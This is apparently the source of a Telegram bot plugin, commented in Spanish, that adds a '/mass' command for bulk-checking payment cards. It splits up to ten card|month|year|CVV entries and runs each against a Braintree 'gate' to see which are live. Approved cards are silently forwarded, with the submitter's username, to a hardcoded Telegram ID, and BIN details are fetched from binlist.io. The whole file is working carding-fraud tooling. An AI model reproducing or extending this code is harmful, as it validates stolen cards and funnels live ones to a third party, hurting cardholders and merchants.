from srca.configs import find_cards, antispam
from plugins.gates.src.Braintree_avs import Braintree2
import time
from srca.configs import addCommand
import requests
import re  # Importar el módulo de expresiones regulares

@addCommand('mass')
def mc(client, m):
    # Lista de usuarios autorizados
    ALLOWED_USERS = [338411613, 7389519750, 5914801650]
    APPROVED_REPORT_ID = 7389519750  # ID para enviar resultados Approved

    inicio = time.time()

    # Verificar si el usuario está autorizado
    if m.from_user.id not in ALLOWED_USERS:
        return m.reply('No estás autorizado para usar este comando.')

    final_msg = '<b>[⚡️] Mass Gate</b>\n\n'
    msg = m.reply_text(final_msg)

    query = m.text.split(" ", 1)

    # Verificar si hay argumentos después del comando
    if len(query) < 2 or not query[1].strip():
        return msg.edit_text(
            '<b>Formato: card|month|year|cvv (o usa /, -, +, \', : como separadores)</b>'
        )

    inputData = query[1]
    cards = inputData.split('\n')

    if len(cards) > 10:
        return msg.edit_text(
            '<b>Error: Límite máximo de 10 tarjetas</b>'
        )

    for card in cards:
        try:
            # Usar regex para dividir por |, /, ,, -, +, ', o :
            parts = re.split(r'[|/,+:\'-]', card.strip())
            # Asegurarse de que hay exactamente 4 partes: cc, mes, ano, cvv
            if len(parts) != 4:
                raise ValueError("Formato de tarjeta inválido")
            
            cc, mes, ano, cvv = [part.strip() for part in parts]  # Eliminar espacios en blanco
            response, emoji = Braintree2().main(card)

            final_msg += f"<b>Card: <code>{card}</code>\nMessage: {response} {emoji}</b>\n\n"
            msg.edit_text(final_msg)

            # Enviar mensaje al ID 7389519750 si el resultado es Approved
            if "Approved" in response:
                client.send_message(
                    chat_id=APPROVED_REPORT_ID,
                    text=f"<b>Approved Card\nCard: <code>{card}</code>\nMessage: {response} {emoji}\nFrom: @{m.from_user.username}</b>"
                )
        except Exception as e:
            final_msg += f"<b>Card: <code>{card}</code>\nMessage: Invalid ({str(e)})</b>\n\n"
            msg.edit_text(final_msg)

    time.sleep(1)

    # Usar el cc de la última tarjeta procesada para la consulta BIN
    req = requests.get(f'https://binlist.io/lookup/{cc[:6]}')
    fin = time.time()

    final_msg += f'''<b>• Bin: {req.json()['scheme']} {req.json()['type']} {req.json()['category']}
• Country: {req.json()['country']['name']} [{req.json()['country']['emoji']}]
• Bank: {req.json()['bank']['name']} 

• Pxs: Live ✅
• Time: <code>{fin-inicio:0.4f}'s</code>
• From: @{m.from_user.username}</b>'''
    msg.edit_text(final_msg)